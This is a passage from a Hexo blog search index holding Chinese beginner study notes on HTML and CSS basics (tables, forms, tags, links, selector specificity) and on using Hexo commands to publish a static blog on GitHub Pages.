B）为了简化代码，可以把伪类选择符中相同的声明提出来放在a选择符中； 例如：a&#123;color:red;&#125;a:hover&#123;color:green;&#125;表示超链接的初始和访问过后的状态一样，鼠标划过的状态和点击时的状态一样。</code></pre><p>6.选择器的权重<br>!important&gt;内联样式&gt;包含选择符&gt;id选择器&gt;class选择器&gt;类型（元素）选择器<br>有冲突时高权重覆盖低权重<br>相同权重就近原则（哪个先被定义）</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>渔夫出海前，并不知道鱼在哪里。可他们还是选择了出发，因为他们相信，自己一定会满载而归。人生很多时候，是因为选择了才有机会，相信了才有可能。————稻盛和夫</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221007</title>
      <link href="/2022/10/07/b-3/"/>
      <url>/2022/10/07/b-3/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot; width=&quot;500px&quot;               &lt;!-- 创建表格 --&gt;    align=&quot;center&quot;    bordercolor=&quot;red&quot;    bgcolor=&quot;yellow&quot;    cellspacing=&quot;20&quot;    cellpadding=&quot;100&quot;&gt;                            &lt;!-- 可以选择换不换行，但是&gt;要放在最后 --&gt;        &lt;tr&gt;                                      &lt;!-- tr是行 --&gt;            &lt;td&gt;内容&lt;/td&gt;                         &lt;!-- td是单元格 --&gt;        &lt;/tr&gt;        &lt;tr bgcolor=&quot;orange&quot; height=&quot;100&quot; align=&quot;center&quot; valign=&quot;bottom&quot;&gt;            &lt;td bgcolor=&quot;red&quot; align=&quot;right&quot; valign=&quot;top&quot;&gt;内容&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;表格table属性 1. 宽度 width            （可以写成百分比————父元素的百分比）2. 高度 height           （只能写像素px）3. 边框 border 4. 边框颜色 bordercolor 5. 背景颜色 bgcolor 6. 水平对齐 align=&quot;left&quot;或right或center 7. cellspacing=&quot;单元格与单元格之间的间距 8. cellpadding=&quot;单元格与内容之间的空隙行tr属性 1. 高度 height 2. 背景颜色 色bgcolor 3. 文字水平对齐 align=“left或right或center” 4. 文字垂直对齐 子valign=“top或middle或bottom&quot;单元格td属性（table data）1. 宽度 width （影响一列）2. 高度 height （影响一行）3. 背景颜色 bgcolor 4. 文字水平对齐 align=“left或right或center” 5. 文字垂直对齐 valign=“top或middle或bottom表格合并colspan=&quot;要合并的列数&quot;rowspan=&quot;要合并的行数&quot;注意不能合并成T型，合并之后要把被占的元素删除（注释掉）</code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre><code>&lt;body&gt;    &lt;form action=&quot;地址&quot; method=&quot;POST&quot;&gt;                                                     &lt;!-- POST是不显示在url的，GET会暴露 --&gt;        内容：&lt;input type=&quot;text&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;        &lt;!-- 输入的完全显示 --&gt;        内容：&lt;input type=&quot;password&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;    &lt;!-- 输入的显示为一个点 --&gt;        &lt;input type=&quot;submit&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 提交信息到action指定的地址 --&gt;           &lt;input type=&quot;reset&quot; value=&quot;按钮上的内容&quot; &gt;                                          &lt;!-- 清除全部表单内容 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 自定义按钮 --&gt;    &lt;/form&gt;&lt;/body&gt;***不设置name就不能发送***typr=&quot;submit&quot;相当于&lt;button&gt;内容&lt;/button&gt;Form当中method的post和get的区别？ 1.get是从服务器上获取数据，post是向服务器传送数据。 2.get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段——对应，在URL中可以看到。  post 是通过HTTPpost机制，将表单内各个字段与其内容放置在HTMLHEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 3.对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 4.get传送的数据量较小。post传送的数据量较大，一般为不受限制。</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>生活，在喜怒哀乐间走走停停 不知道会遇见什么，只知道阳光这么好，别辜负了今天，早安！</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221006</title>
      <link href="/2022/10/06/b-4/"/>
      <url>/2022/10/06/b-4/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221006</title>
      <link href="/2022/10/06/b-5/"/>
      <url>/2022/10/06/b-5/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221005</title>
      <link href="/2022/10/05/b-2/"/>
      <url>/2022/10/05/b-2/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>1.今天给blog整了个大装修<br>2.除此之外好像啥也没干</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h3><p>在装修过程中发现了修改和添加模块基本上就是更改source和themes两个文件夹<br>原因在上一篇文章中已经给出了详细说明。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>无论在何种困顿中，唯有内心的自由馈赠我们真正的未来。</p><h3 id="今天就这样吧"><a href="#今天就这样吧" class="headerlink" title="今天就这样吧"></a>今天就这样吧</h3>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Something Write</title>
      <link href="/2022/10/05/b-1/"/>
      <url>/2022/10/05/b-1/</url>
      
        <content type="html"><![CDATA[<h5 id="深入了解Hexo搭建博客的底层原理"><a href="#深入了解Hexo搭建博客的底层原理" class="headerlink" title="深入了解Hexo搭建博客的底层原理"></a>深入了解Hexo搭建博客的底层原理</h5><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在趟过无数个坑，解决了无数个报错后，终于把这个博客整出来了。<br>现在回过头来，开始对hexo原理好奇起来。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点很明显啊，主题多，文件多(利于解决各种各样天花乱坠的报错)，通过修改yaml配置文件来修改样式比较简单。<br>但是缺点一样很明显，bug是真的多(一步错步步错)，每次发布文章都需要重新部署，没有一个后台管理系统(加上GitHub的海外服务器，简直让人欲仙欲死)。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>博客hexo生成的是静态页面，而Github pages 又支持静态页面的解析。因此二者一拍即合能够用来生成 html 拼合成博客。</p><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>1.Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br>2.文件<br>  ├── node_modules：             #依赖包-安装插件及所需nodejs模块。<br>  ├── public                     #最终网页信息。即存放被解析markdown、html文件。<br>  ├── scaffolds                  #模板文件夹。即当您新建文章时，根据 scaffold生成文件。<br>  ├── source                     #资源文件夹。即存放用户资源。<br>  └── _posts                     #博客文章目录。<br>  └── themes                     #存放主题。Hexo根据主题生成静态页面。<br>  ├── _config.yml                #网站的配置信息。标题、网站名称等。<br>  ├── db.json：                  #source解析所得到的缓存文件。<br>  ├── package.json               # 应用程序信息。即配置Hexo运行需要js包。<br>3.source就是数据库，以.md（markdown）格式存储文章，theme文件夹是主题文件（决定页面模板）。<br>4.部署流程:<br>hexo g：生成静态文件。将我们的数据和界面模板相结合生成静态文件的过程。Hexo（node.js程序）遍历主题文件中你的source目录（js、css、img等静态资源），建立索引，再根据索引生成由html、js、css、img建立的纯静态文件并放在public文件夹里。public就是你的博客了，而这些恰好能被gitpages识别。<br>hexo d：部署文件。主要是根据在_config.yml中配置的git仓库或者coding的地址，将public文件通过git方式push到上传到github或coding的指定分支，然后在根据pages服务呈现出页面。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试验</title>
      <link href="/2022/10/04/a/"/>
      <url>/2022/10/04/a/</url>
      
        <content type="html"><![CDATA[<p><a href="http://t.csdn.cn/FwpOt">写作教程总结</a></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>hexo server</p><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>hexo new a</p><h1 id="新建草稿"><a href="#新建草稿" class="headerlink" title="新建草稿"></a>新建草稿</h1><p>hexo new draft b</p><h1 id="发布草稿成为文章"><a href="#发布草稿成为文章" class="headerlink" title="发布草稿成为文章"></a>发布草稿成为文章</h1><p>hexo publish b</p><h1 id="发布关于"><a href="#发布关于" class="headerlink" title="发布关于"></a>发布关于</h1><p>hexo new page c</p><h1 id="生成静态文章"><a href="#生成静态文章" class="headerlink" title="生成静态文章"></a>生成静态文章</h1><p>hexo generate 或者是 hexo g</p><h1 id="部署文章"><a href="#部署文章" class="headerlink" title="部署文章"></a>部署文章</h1><p>hexo deploy 或者是 hexo d</p><p>Markdowm语法:<a href="http://t.csdn.cn/BJSXy">教程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221004</title>
      <link href="/2021/09/25/b/"/>
      <url>/2021/09/25/b/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a><strong>每日一记</strong></h3><p>如何使用hexo编写blog文章<br>1.在blog本地文件夹内git bash<br>2.hexo s                                     <em>本地查看，似乎没什么用？</em><br>3.hexo new draft b                           <em>建立草稿</em><br>4.hexo publish b                             <em>发表草稿</em><br>5.hexo new page c                            <em>发布关于</em><br>6.hexo g                                     <em>生成静态文件————也就是能读</em><br>7.hexo d                                     <em>上传部署至GitHub</em><br>8.打开GitHub的个人库查看有没有绿               <em>不是我说，是真的慢！！！！！</em><br>9.打开blog刷新</p><p>如何快速上传<br>————使用DevSidecar边车辅助工具</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a><strong>每日一悟</strong></h3><p>1.每次上传都是对比本地的，不要想着在GitHub里改就能偷懒！<br>2.每次写新文章都可以用上面的，但是最好在b和c后面加上日期<br>3.上传了之后发现有问题可以在本地用VSC改了再发一次<br>4.上面说的修改是指在删除D:\BLOG\hexoblog\source\。。。的同时修改D:\BLOG\hexoblog\source\的对应文件<br>5.如果出现界面信息错误就在D:\BLOG\hexoblog\themes\hexo-theme-matery\的_config这里修改<br>6.猜测要加入其他模块也是在上面那个文件里<br>7.已经尝试了两种方法仍然不能显示图片，应该只能使用图床才能解决(一年9r)<br>8.为了更好地写博客，希望大家赏一个钢镚儿</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a><strong>每日一句</strong></h3><p>知识使人自由，至少渴望自由。————特雷弗-诺亚</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
